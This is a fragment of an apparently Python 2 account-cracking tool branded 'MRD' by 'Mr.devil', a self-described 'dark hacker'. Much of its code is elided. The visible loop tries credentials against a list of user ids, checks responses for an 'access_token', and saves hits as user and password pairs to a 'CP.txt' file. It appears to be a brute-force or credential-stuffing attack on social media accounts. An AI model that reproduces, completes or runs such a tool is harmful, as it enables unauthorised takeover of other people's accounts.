...
__author__ = 'Mr.devil'
__copyright = 'All rights reserved . Copyright Mr.devil_brand'
...
\033[0;95m═══════════════════════════════════════════
\033[0;91m>>>\033[0;91m[OWNER   :\033[0;92mMR.DEVIL       
\033[0;91m>>>\033[0;91m[TOOL nm :\033[0;92mMRD version 2.0.4
\033[0;91m>>>\033[0;91m[MR.DEVIL:\033[0;92mPROGRAMMER & DARK HACKER
\033[0;95m═══════════════════════════════════════════
                                                      """ 
...
def action():
    ...
    print(47*'-')
    xxx = str(len(id))
    jalan('\x1b[1;96m PROCESS HAS BEEN START TOTAL IDS :\x1b[1;95m ' + xxx)
    print(47*'-')
    def main(arg):
        user = arg
        try:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
